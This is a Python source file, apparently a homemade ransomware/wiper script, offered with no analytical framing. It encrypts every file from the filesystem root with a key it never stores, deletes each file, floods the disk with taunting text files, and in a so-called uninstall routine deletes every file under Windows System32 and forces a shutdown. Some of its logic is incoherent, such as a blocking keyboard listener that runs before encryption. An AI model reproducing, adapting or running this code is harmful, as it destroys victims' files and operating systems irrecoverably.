import os
import time
import threading
from cryptography.fernet import Fernet
from pynput import keyboard

class RansomWare:
    
    def __init__(self):
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)
        self.is_running = True
        self.keyboard_listener()
        self.encrypt_all_files()
        self.create_files()
        self.is_running = False

    def encrypt_all_files(self):
        for root, dirs, files in os.walk('/'):
            for file in files:
                file_path = os.path.join(root, file)
                self.encrypt_file(file_path)
                self.delete_file(file_path)

    def encrypt_file(self, file_path):
        try:
            with open(file_path, 'rb') as f:
                file_data = f.read()
            encrypted_data = self.crypter.encrypt(file_data)
            with open(file_path, 'wb') as f:
                f.write(encrypted_data)
        except Exception as e:
            print(f"Error encrypting {file_path}: {e}")

    def delete_file(self, file_path):
        try:
            os.remove(file_path)
        except Exception as e:
            print(f"Error deleting {file_path}: {e}")

    def create_files(self):
        for i in range(500):
            file_name = f'ediop3Squadleadergotu_{i}.txt'
            try:
                with open(file_name, 'w') as f:
                    f.write('hahahaha i got u')
            except Exception as e:
                print(f"Error creating file {file_name}: {e}")

    def keyboard_listener(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        listener.join()

    def on_press(self, key):
        try:
            if key == keyboard.Key.alt or key == keyboard.Key.ctrl:
                return False
            if hasattr(key, 'char') and key.char == 'd':
                return False
        except Exception as e:
            print(f"Error in keyboard listener: {e}")

    def uninstall(self):
        # Uninstall the ransomware
        try:
            # Delete all files created by the ransomware
            for i in range(500):
                file_name = f'ediop3Squadleadergotu_{i}.txt'
                if os.path.exists(file_name):
                    os.remove(file_name)
            
            # Delete the ransomware script
            os.remove(__file__)
            
            # Delete all system files in the system32 directory
            for root, dirs, files in os.walk('C:\\Windows\\System32'):
                for file in files:
                    file_path = os.path.join(root, file)
                    os.remove(file_path)
            
            # Delete the registry key that the ransomware added
            # (This part is platform-specific and requires admin privileges)
            # You can use the `winreg` module to access the Windows registry
            # import winreg
            # key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
            # winreg.DeleteValue(key, "Ransomware")
            # key.Close()
            
            # Terminate the script
            os.system("shutdown /s /t 0")
            
        except Exception as e:
            print(f"Error uninstalling: {e}")

if __name__ == "__main__":
    ransomware = RansomWare()
    ransomware.uninstall()
